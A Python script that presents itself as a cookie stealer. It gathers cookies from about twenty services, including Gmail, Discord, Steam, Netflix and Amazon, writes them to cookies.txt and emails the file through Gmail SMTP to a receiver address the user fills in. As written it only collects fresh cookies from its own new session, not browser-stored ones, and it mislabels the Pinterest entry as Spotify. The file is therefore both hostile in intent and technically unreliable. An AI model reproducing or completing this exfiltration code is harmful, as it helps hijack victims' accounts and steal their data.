import requests
import smtplib
import time
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

time.sleep(2)

def main():
    #getting cookies and storing them in a variable

    y_url = "https://www.youtube.com"
    s = requests.session()
    s.get(y_url)
    y_cookies = s.cookies.get_dict()

    i_url = "https://www.instagram.com"
    s.get(i_url)
    i_cookies = s.cookies.get_dict()
    
    t_url = "https://www.twitch.tv"
    s.get(t_url)
    t_cookies = s.cookies.get_dict()

    tw_url = "https://twitter.com"
    s.get(tw_url)
    tw_cookies = s.cookies.get_dict()

    gh_url = "https://github.com"
    s.get(gh_url)
    gh_cookies = s.cookies.get_dict()

    gm_url = "https://mail.google.com"
    s.get(gm_url)
    gm_cookies = s.cookies.get_dict()

    s_url = "https://store.steampowered.com"
    s.get(s_url)
    s_cookies = s.cookies.get_dict()

    dc_url = "https://discord.com"
    s.get(dc_url)
    dc_cookies = s.cookies.get_dict()

    fc_url = "https://www.facebook.com"
    s.get(fc_url)
    fc_cookies = s.cookies.get_dict()

    vk_url = "https://vk.com"
    s.get(vk_url)
    vk_cookies = s.cookies.get_dict()

    wp_url = "https://web.whatsapp.com"
    s.get(wp_url)
    wp_cookies = s.cookies.get_dict()
    
    hbo_url = "https://www.hbomax.com"
    s.get(hbo_url)
    hbo_cookies = s.cookies.get_dict()

    dp_url = "https://www.disneyplus.com"
    s.get(dp_url)
    dp_cookies = s.cookies.get_dict()

    n_url = "https://www.netflix.com"
    s.get(n_url)
    n_cookies = s.cookies.get_dict()

    r_url = "https://www.reddit.com"
    s.get(r_url)
    r_cookies = s.cookies.get_dict()

    amz_url = "https://www.amazon.com"
    s.get(amz_url)
    amz_cookies = s.cookies.get_dict()

    spf_url = "https://www.shopify.com"
    s.get(spf_url)
    spf_cookies = s.cookies.get_dict()

    spr_url = "https://www.shopier.com"
    s.get(spr_url)
    spr_cookies = s.cookies.get_dict()

    sptfy_url = "https://open.spotify.com"
    s.get(sptfy_url)
    sptfy_cookies = s.cookies.get_dict()

    ptrst_url = "https://www.pinterest.com/"
    s.get(ptrst_url)
    ptrst_cookies = s.cookies.get_dict()

    #writing cookies in "cookies.txt"

    with open('cookies.txt', 'w') as f:
        f.write(str(f"youtube: {y_cookies}\n"))
        f.write(str(f"instagram: {i_cookies}\n"))
        f.write(str(f"twitch: {t_cookies}\n"))
        f.write(str(f"twitter: {tw_cookies}\n"))
        f.write(str(f"github: {gh_cookies}\n"))
        f.write(str(f"gmail: {gm_cookies}\n"))
        f.write(str(f"steam: {s_cookies}\n"))
        f.write(str(f"discord: {dc_cookies}\n"))
        f.write(str(f"facebook: {fc_cookies}\n"))
        f.write(str(f"vk: {vk_cookies}\n"))
        f.write(str(f"whatsapp: {wp_cookies}\n"))
        f.write(str(f"hbo: {hbo_cookies}\n"))
        f.write(str(f"disney+: {dp_cookies}\n"))
        f.write(str(f"netflix: {n_cookies}\n"))
        f.write(str(f"reddit: {r_cookies}\n"))
        f.write(str(f"amazon: {amz_cookies}\n"))
        f.write(str(f"shopify: {spf_cookies}\n"))
        f.write(str(f"shopier: {spr_cookies}\n"))
        f.write(str(f"spotify: {sptfy_cookies}\n"))
        f.write(str(f"spotify: {ptrst_cookies}\n"))

    #setting smtp server

    smtp_port = 587                 
    smtp_server = "smtp.gmail.com"  

    #setting senders/receivers and account information

    email_from = "Type here your mail"
    x = "Type here the receiver mail"
    email_list = [x]

    pswd = "Type here the app password of your account"

    #creating mail content

    subject = "cookies"

    def mail(email_list):

        for person in email_list:
            body = f"""
            cookies
            """
            msg = MIMEMultipart()
            msg['From'] = email_from
            msg['To'] = person
            msg['Subject'] = subject

            #attaching file

            msg.attach(MIMEText(body, 'plain'))

            filename = "cookies.txt"

            attachment= open(filename, 'rb')  

            attachment_package = MIMEBase('application', 'octet-stream')
            attachment_package.set_payload((attachment).read())
            encoders.encode_base64(attachment_package)
            attachment_package.add_header('Content-Disposition', "attachment; filename= " + filename)
            msg.attach(attachment_package)

            text = msg.as_string()

            #sending cookies via gmail

            TIE_server = smtplib.SMTP(smtp_server, smtp_port)
            TIE_server.starttls()
            TIE_server.login(email_from, pswd)
            print()

            print(f"Sending cookies to: {person}...")
            TIE_server.sendmail(email_from, person, text)
            print(f"Cookies sent to: {person}")
            print()

        TIE_server.quit()

    #calling send mail function

    mail(email_list)

if __name__ == "__main__":
    main()
